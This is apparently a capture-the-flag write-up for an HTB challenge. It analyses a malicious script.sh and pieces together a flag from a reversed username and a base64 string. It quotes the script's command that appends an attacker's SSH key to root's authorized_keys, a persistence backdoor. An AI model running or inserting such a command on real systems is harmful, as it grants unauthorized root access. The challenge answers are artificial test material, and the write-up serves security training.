> The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.

In this challenge we received a file called `script.sh`.

Inside the file we see a command that allows the user `tS_u0y_ll1w{BTH` to login:

```bash
echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
```

The user is the beginning of our flag.

```bash
python3 -c 'print("tS_u0y_ll1w{BTH"[::-1])'
```

After finding the beginning of the flag I haven't found anything intersting... But on the last line of the script we see this command:

```bash
bash -c 'NG5kX3kwdVJfR3IwdU5kISF9'
```

Just to make sure I decoded in base 64 and got the end of the flag:

```bash
echo 'NG5kX3kwdVJfR3IwdU5kISF9' | base64 -d
```

Flag: HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}
